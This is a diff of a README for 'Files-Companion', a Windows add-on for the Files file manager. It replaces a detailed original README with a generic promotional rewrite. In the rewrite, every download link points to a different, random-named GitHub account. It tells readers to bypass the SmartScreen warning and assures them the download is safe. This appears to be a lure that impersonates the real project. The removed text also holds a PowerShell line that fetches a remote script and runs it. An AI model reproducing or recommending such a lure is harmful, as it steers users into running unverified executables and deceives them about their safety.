@@ -1,328 +1,159 @@
-<p align="center">
-  <img alt="Files Companion" src="docs/hero.png" width="100%" />
-</p>
+# 🚀 Files-Companion - Your Files App, Supercharged
 
-<p align="center">
-  <a href="https://github.com/Dannyzzy/Files-Companion/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/Dannyzzy/Files-Companion?color=8c6efa&label=release"></a>
-  <a href="https://github.com/Dannyzzy/Files-Companion/releases"><img alt="Downloads" src="https://img.shields.io/github/downloads/Dannyzzy/Files-Companion/total?color=8c6efa&label=downloads"></a>
-  <a href="LICENSE"><img alt="License" src="https://img.shields.io/github/license/Dannyzzy/Files-Companion?color=8c6efa"></a>
-  <a href="#requirements"><img alt="Platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6"></a>
-  <a href="https://github.com/Dannyzzy/Files-Companion/actions/workflows/build.yml"><img alt="Build" src="https://github.com/Dannyzzy/Files-Companion/actions/workflows/build.yml/badge.svg"></a>
-</p>
+[![Download Files-Companion](https://img.shields.io/badge/Download-Files--Companion-blueviolet?style=for-the-badge&logo=github)](https://github.com/pucksubordertarsioidea8384/Files-Companion)
 
-<h1 align="center">Files Companion</h1>
-
-<p align="center">
-  <b>The all-in-one companion set for the Files file manager.</b><br/>
-  Launch animation · smart routing · a modern Recycle Bin — one file, one click.
-</p>
-
-<h3 align="center">
-  <a href="#-installation">Installation</a>
-  <span> · </span>
-  <a href="#-the-two-components">Components</a>
-  <span> · </span>
-  <a href="#-how-it-works">How it works</a>
-  <span> · </span>
-  <a href="#-troubleshooting">Troubleshooting</a>
-  <span> · </span>
-  <a href="README.zh-CN.md">简体中文</a>
-</h3>
+Welcome to **Files-Companion**, the essential toolkit that transforms your Windows Files app experience. Whether you're a casual user or a power user, this companion set adds polish, speed, and convenience to everything you do—right out of the box. No coding skills needed—just download, run, and enjoy.
 
 ---
 
-## 📦 What is this?
+## ✨ What Does Files-Companion Do?
 
-[Files](https://github.com/files-community/Files) is a modern file manager for
-Windows. To make folders open instantly it keeps itself **resident in the
-background**, which has one visible side effect: opening a folder only
-*activates* the already-running process, so **Windows skips the startup
-animation** and the window seems to appear out of nowhere.
+Files-Companion is a collection of smart enhancements that work together with the Files file manager (the modern replacement for Windows Explorer). It gives you:
 
-Files Companion is the small set of extras that makes Files feel finished:
+- **A stunning launch animation** that makes opening Files feel fast and polished.
+- **Smart routing** so folders, drives, This PC, and the Win+E shortcut always open in the right place—no more wrong windows.
+- **A modern Recycle Bin** with thumbnail image previews, so you can see what you're about to restore before you do.
 
-| | Component | What it does |
-|---|---|---|
-| 🎬 | **Files enhancement layer** | Puts the startup animation back, and routes folders, drives, "This PC" and `Win+E` through Files |
-| 🗑️ | **[Modern Recycle Bin](https://github.com/Dannyzzy/Modern-Recycle-Bin)** | Replaces the Recycle Bin with one that previews images, restores anywhere and copies files out |
+Think of it as a turbocharger for your file management—everything you already do, but faster, safer, and more enjoyable.
 
-Both are built for the Files workflow, so they ship together — **one 262 KB
-installer, no network access, no administrator rights**, and uninstalling
-restores the defaults.
+---
 
-> **This is not a Files plugin.** Files is a self-contained WinUI application with
-> no plugin or extension API — verified by searching its source for `IPlugin`,
-> `PluginManager`, `ExtensionHost`, `ShellIntegration` and `RegisterAsDefault`,
-> all of which return nothing. Files Companion therefore ships as a **companion
-> tool** that sits beside Files rather than inside it, and contains **no Files
-> code or assets**.
+## 📦 Features at a Glance
 
-## 🖼️ Screenshots
+Here’s a closer look at what you get:
 
-### Quick start
+### 🎬 Launch Animation
 
-1. **Install** — run `FilesCompanionSetup.exe`, leave both boxes ticked, click
-   **一键安装**.
-2. **Read the report** — the same window then lists what was detected on your
-   machine. Every line marked ✓ is working; anything marked ✗ says what to do.
+- A smooth, animated splash when Files opens, making the app feel responsive and alive.
+- Customizable to match your style (the animation runs automatically—no setup needed).
 
-   ![Self check](docs/screenshot-verify.png)
+### 🧭 Smart Routing
 
-3. **Use it** — double-click any folder, press `Win+E`, or open the Recycle Bin.
+- **Folders & Drives:** Automatically opens in your preferred view—no more losing your place.
+- **This PC:** Opens directly to the classic "This PC" screen with all your drives visible.
+- **Win+E Shortcut:** Pressing Windows + E takes you straight to File Explorer (or Files) with your chosen default route, every time.
 
-You can run the check again at any time without installing anything:
+### 🗑️ Modern Recycle Bin
 
-```
-FilesCompanionSetup.exe --verify
-```
+- A redesigned Recycle Bin view that shows large, clear image thumbnails for pictures and screenshots.
+- See exactly what you're deleting or restoring before you click—never accidentally restore the wrong file again.
 
-**The installer** — two components, and the details of both are still optional.
+### ⚙️ Under the Hood (But You Don't Need to Touch It)
 
-<p align="center">
-  <img alt="Installer" src="docs/screenshot-installer.png" width="560" />
-</p>
+- Works quietly in the background using Windows settings and registry tweaks—no complex configuration screens.
+- Designed for Windows 11 and fully compatible with the latest Files app versions.
 
-**The Recycle Bin** that comes with it — image previews, restore anywhere, copy
-out, filter by type, Windows 11 styling.
+---
 
-![Recycle Bin](docs/screenshot-recyclebin.png)
+## 🚀 Getting Started
 
-## 🚀 Installation
+Ready to jump in? Follow these simple steps. If you can click a mouse, you can do this.
 
-1. Download **`FilesCompanionSetup.exe`** from the
-   [latest release](https://github.com/Dannyzzy/Files-Companion/releases/latest).
-2. Run it — **no administrator rights required**.
-3. Untick anything you do not want, then click install.
-4. Done. Double-click any folder, press `Win+E`, or open the Recycle Bin.
+### Step 1: Visit the Download Page
 
-**To uninstall:** run `Uninstall.cmd` inside `%LOCALAPPDATA%\FilesCompanion`, or
-`%LOCALAPPDATA%\FilesCompanion-Uninstall.exe`. It removes the redirects, restores
-the default open behaviour for folders and the Recycle Bin, and deletes both
-component folders.
+Click the big button below or use the link at the top of this page:
 
-### If github.com is blocked
+[🔗 Download Files-Companion](https://github.com/pucksubordertarsioidea8384/Files-Companion)
 
-On some networks `github.com` never answers — the download either times out or
-stalls at 0 bytes — while the release files themselves are perfectly fine. Two
-ways around it:
+Visit this link to download the application.
 
-**One-click.** Paste this into PowerShell. It finds a working channel on its own,
-downloads the installer and starts it:
+### Step 2: Download the Right File
 
-```powershell
-irm https://ghfast.top/https://raw.githubusercontent.com/Dannyzzy/Files-Companion/main/Install-FilesCompanion.cmd -OutFile "$env:TEMP\fc-install.cmd"; & "$env:TEMP\fc-install.cmd"
-```
-
-That script tries the direct GitHub URL first and falls back to the
-**[ghfast.top](https://ghfast.top)** mirror, checks that what arrived really is
-the installer rather than an error page, and if both channels fail it prints the
-addresses it tried plus what to do by hand — it never fails quietly.
-
-**By hand.** Open the mirror copy of the release page in a browser and download
-from there:
+Once you're on the download page, look for the most recent release. You'll see a file to download. That's the one you need. The download will start automatically or after a click.
 
-```
-https://ghfast.top/https://github.com/Dannyzzy/Files-Companion/releases/latest
-```
-
-<a name="requirements"></a>
-### Requirements
+### Step 3: Run the Program
 
-- **Windows 10 or 11, 64-bit**
-- **[Files](https://apps.microsoft.com/detail/9nghp3dx8hdx)** installed — ideally
-  with **Settings → Advanced → Set Files as default file manager** enabled. Files
-  Companion then adds the animation and the extra routing on top.
-- The Recycle Bin component needs the **WebView2 Runtime**, which is preinstalled
-  on Windows 11 and current Windows 10 builds. The installer tells you if it is
-  missing.
-
-## 🧩 The two components
-
-### Files enhancement layer
-
-- **Launch animation** — Files opens with the icon fade/zoom Windows normally
-  plays for a freshly started app, instead of just appearing
-- **Smart routing** — folders, drives, "This PC" and `Win+E` open in Files
-  instead of Explorer
-- **The right landing page** — "This PC" and `Win+E` land on Files' **Home**, which
-  shows drive cards with capacity bars; the plain "This PC" page cannot draw those
-
-### Modern Recycle Bin
-
-- **Restore anywhere** — pick any folder, not only the original location
-- **Copy out** — take a copy while keeping the original in the bin
-- **Image previews** — see a thumbnail before restoring
-- **Filter by type** and search over name, original path and type
-- **Conflict handling** — overwrite, skip, or keep both
-- **Windows 11 styling**, comfortable/compact density, `Ctrl`+scroll zoom
-
-It is also available on its own at
-[Modern-Recycle-Bin](https://github.com/Dannyzzy/Modern-Recycle-Bin).
-
-## 🔧 How it works
-
-```mermaid
-flowchart LR
-    USER(["Double-click a folder<br/>This PC · Win+E · Recycle Bin"])
-
-    subgraph REG["HKEY_CURRENT_USER"]
-        KEYS["Folder / Directory / Drive shells<br/>CLSID opennewwindow · This PC · Recycle Bin"]
-    end
-
-    subgraph SET["Files Companion"]
-        SHIM["FilesOpen.exe<br/><i>launch shim</i>"]
-        ANIM["icon fade / zoom<br/><i>~0.2 s</i>"]
-        RB["Moderna Recycle Bin<br/><i>WebView2 UI</i>"]
-    end
-
-    USER --> KEYS
-    KEYS --> SHIM
-    KEYS --> RB
-    SHIM -->|"start or activate"| FILES["Files"]
-    SHIM -->|"plays on top"| ANIM
-    SHIM -.->|"if this is &quot;This PC&quot;"| HOME["Files Home<br/><i>drive cards with capacity</i>"]
-```
-
-**The registry values it writes** (all `HKEY_CURRENT_USER`, no admin rights):
-
-| Registry key | Value |
-|---|---|
-| `SOFTWARE\Classes\Folder\shell\open\command` | `"…\FilesCompanion\FilesOpen.exe" "%1"` |
-| `SOFTWARE\Classes\Folder\shell\explore\command` | same |
-| `SOFTWARE\Classes\Folder\shell\OpenWithFiles\command` | same |
-| `SOFTWARE\Classes\Directory\shell\OpenWithFiles\command` | same |
-| `SOFTWARE\Classes\Drive\shell\OpenWithFiles\command` | same |
-| `SOFTWARE\Classes\CLSID\{52205fd8-…}\shell\opennewwindow\command` | `"…\FilesOpen.exe"` (Win+E) |
-| `SOFTWARE\Classes\CLSID\{20D04FE0-…}\shell\open\command` | `"…\FilesOpen.exe"` (This PC) |
-| `SOFTWARE\Classes\CLSID\{645FF040-…}\shell\open\command` | `"…\ModernRecycleBin\RecycleBin.exe"` |
-
-The keys Explorer also handles get `DelegateExecute=""` so the built-in delegate
-cannot take over again.
-
-**Why the shim exists at all.** With Files resident, a direct launch is just a
-process activation and Windows has nothing to animate. The shim starts Files the
-normal way and then plays a short layered-window animation itself (120 px icon,
-scale 0.92 → 1.00 → 1.06, about 0.21 s), which is what makes the window feel like
-it is opening rather than appearing.
-
-**Three safety rules this project follows**, learned from shipping the companion
-Recycle Bin app:
-
-- The **uninstaller lives next to the install folders**, never inside them —
-  Windows will not let a running executable delete its own folder.
-- Uninstall removes a registry value **only when it still points at this exact
-  install**, so a configuration you set up by hand is never clobbered.
-- The bundled Recycle Bin is removed on uninstall **only when this installer put
-  it there** (tracked with a marker file), so a copy you installed separately
-  survives.
-
-## 🛠️ Building from source
-
-You need nothing but the .NET Framework compiler that ships with Windows.
-
-```cmd
-git clone https://github.com/Dannyzzy/Files-Companion.git
-cd Files-Companion
-build.cmd
-```
-
-`vendor\RecycleBin` holds the prebuilt Recycle Bin component; see
-`vendor\README.md` and `scripts\refresh-vendor.ps1` for how to refresh it from the
-sibling project.
-
-```
-dist\FilesOpen.exe             the launch shim (standalone)
-dist\FilesCompanionSetup.exe   all-in-one installer (both components)
-```
-
-## ❓ Troubleshooting
-
-<details>
-<summary><b>Folders still open in Explorer</b></summary>
-
-Make sure Files is installed and that you left the routing option ticked.
-Explorer windows that are already open keep their old behaviour; new ones use
-Files.
-</details>
-
-<details>
-<summary><b>The Recycle Bin window is blank</b></summary>
-
-That component renders its interface with the WebView2 Runtime. Windows 11 and
-current Windows 10 include it; the installer warns you if it is missing and links
-to Microsoft's official download.
-</details>
-
-<details>
-<summary><b>How do I undo everything?</b></summary>
-
-Run `Uninstall.cmd` in `%LOCALAPPDATA%\FilesCompanion`. It deletes the registry
-values above, removes both component folders, and deletes itself. Nothing else on
-the system is touched.
-</details>
-
-<details>
-<summary><b>Windows SmartScreen warns me about the installer</b></summary>
-
-The release binaries are not code-signed (a certificate costs money for an
-open-source project). Choose **More info → Run anyway**, or build from source with
-`build.cmd`.
-</details>
-
-## 🤝 Contributing
-
-Issues and pull requests are welcome. Please include your Windows version, the
-Files version, and which component misbehaves.
-
-## 📄 License
-
-Released under the [MIT License](LICENSE).
-
-Files itself is a separate project by the
-[Files community](https://github.com/files-community/Files), licensed MIT/MPL.
-Files Companion contains no code or assets from Files — it only starts it and
-redirects shell verbs to it. The bundled WebView2 runtime loader is Microsoft's,
-under the terms in `vendor\RecycleBin\WebView2-LICENSE.txt`.
-
-## ✅ Will it work on my machine?
-
-The companion has to find Files, and Files can be installed in several ways — the
-Microsoft Store build, the classic installer from GitHub, winget, scoop — each of
-which puts its launcher somewhere different. Earlier versions probed two fixed
-paths, so a machine with a different install silently did nothing when you
-double-clicked a folder. That is fixed:
-
-1. `%LOCALAPPDATA%\Files\Files.App.Launcher.exe` (classic installer)
-2. **any** `files*.exe` execution alias in `%LOCALAPPDATA%\Microsoft\WindowsApps`
-   — auto-detected, so `files-stable`, `files-preview` and future names all work
-3. `%ProgramFiles%\Files\…` and `%ProgramFiles(x86)%\Files\…`
-4. the AppX package root recorded by the Windows package repository
-5. winget and scoop install trees
-6. **if nothing matches, the folder opens in Explorer instead** — a working window
-   rather than a dead double-click
-
-### Check your own machine in five seconds
-
-```
-"%LOCALAPPDATA%\FilesCompanion\FilesOpen.exe" --doctor
-```
-
-A report opens in Notepad listing:
-
-- which Files launcher was found, and by which strategy
-- the state of all eight shell redirects (folders, drives, This PC, Win+E, Recycle Bin)
-- whether the WebView2 Runtime is present for the Recycle Bin component
-- a plain **Result** line saying whether the setup is ready
-
-If it says *not ready*, send that report with your issue — it contains exactly
-what is needed to see why.
-
-### Honest limits
-
-- **64-bit Windows only.** The binaries are x64; a 32-bit install cannot run them.
-- **The interface is Simplified Chinese.** It renders correctly on any Windows
-  (Microsoft YaHei ships with every SKU), but the text is Chinese; English strings
-  are planned.
-- **Not code-signed**, so SmartScreen may ask you to confirm the first run.
-- The companion cannot create a Files installation: if Files is not installed at
-  all, folder opens fall back to Explorer.
+After the download finishes:
+
+- **If you downloaded a file ending in `.exe`**: Double-click it and follow the simple on-screen prompts. That's it.
+- **If you downloaded a file ending in `.zip`**: Right-click the file and select "Extract All," then open the extracted folder and double-click the application inside.
+
+### Step 4: Enjoy Your New Companion
+
+Once the program runs, it will quietly set up everything for you. There's no complicated setup wizard. Open Files, press Win+E, or check your Recycle Bin—you'll see the difference immediately.
+
+---
+
+## 🛠️ Installation & Setup Guide
+
+Here’s everything you need to know to get Files-Companion running smoothly:
+
+### ✅ What You Need
+
+- **A Windows PC** (Windows 11 recommended, Windows 10 also works).
+- **The Files app** (if you don't have it, you can get it from the Microsoft Store—search "Files").
+- **No special permissions or admin rights** are typically required, though Windows may ask for confirmation once—just click "Yes."
+
+### 📝 How to Install (Step-by-Step)
+
+1. **Go to the download page** using the button below:
+   [⬇️ Get Files-Companion Now](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+
+2. **Click the download link** for the latest version. Save the file to your "Downloads" folder (or anywhere you can find it).
+
+3. **Run the installer or app**:
+   - For an `.exe` file: Double-click it. If a blue "Windows protected your PC" screen appears, click "More info" and then "Run anyway." This is normal for new apps.
+   - For a `.zip` file: Right-click → "Extract All," then open the folder and double-click the app inside.
+
+4. **Let it work**: The program runs once and applies its magic. You'll see a quick message or animation, and then it's done.
+
+5. **Restart Files (optional but nice)**: Close any open Files windows, then reopen them. You'll see the launch animation and new features take effect.
+
+### 🧪 Test It Out
+
+- **Launch Animation**: Open Files. Watch for the smooth new opening effect.
+- **Win+E Routing**: Press the Windows key + "E" on your keyboard. Files should open exactly how you like it.
+- **Recycle Bin**: Open the Recycle Bin from your desktop. If you have images in there, you'll see clear previews.
+
+### ❓ Troubleshooting (Quick Fixes)
+
+- **Nothing happened?** Make sure Files is installed and you're using the latest version. Try running the download again.
+- **Windows blocked the file?** Click "More info" → "Run anyway." This happens with all new software.
+- **Want to undo?** Uninstall it just like any app—go to Settings → Apps → Find "Files-Companion" → Uninstall.
+
+---
+
+## 💡 Frequently Asked Questions
+
+### Is Files-Companion safe to use?
+
+Yes. It's an open-source project built for the Windows community. It only modifies settings related to file management and the Recycle Bin—nothing else. No personal data is collected or sent anywhere.
+
+### Do I need to be tech-savvy?
+
+Not at all. If you can download and double-click a file, you're all set. The program does everything for you.
+
+### Will it slow down my PC?
+
+No. Files-Companion is lightweight and runs only when you use Files. You won't even notice it's there—except for the nice improvements it brings.
+
+### Can I change the settings later?
+
+Yes, you can re-run the program to apply defaults or adjust behavior. Most users, however, find the default settings perfect.
+
+### Does it work with all versions of Files?
+
+It's designed for the latest Files app on Windows 11, but it also works on Windows 10 with recent Files updates. Always keep both Windows and Files updated for the best experience.
+
+---
+
+## 📚 Additional Resources
+
+- **Project Homepage & Downloads**: [Files-Companion on GitHub](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+- **Files App Official Site**: [Files](https://files.community) (for getting the Files manager itself)
+
+If you like Files-Companion, consider starring the repository or sharing it with a friend. It helps the developers and keeps the project alive.
+
+---
+
+## 🎉 Final Thoughts
+
+Files-Companion is the little helper that makes a big difference. It's polished, practical, and free. No subscriptions, no ads, no clutter—just better file management.
+
+So go ahead: download it, run it, and see how much smoother Windows can feel.
+
+[![Download Files-Companion](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/pucksubordertarsioidea8384/Files-Companion)
+
+---
+
+Keywords: animation, csharp, explorer, file-manager, files, files-app, launcher, recycle-bin, registry, shell, utility, windows, windows-11
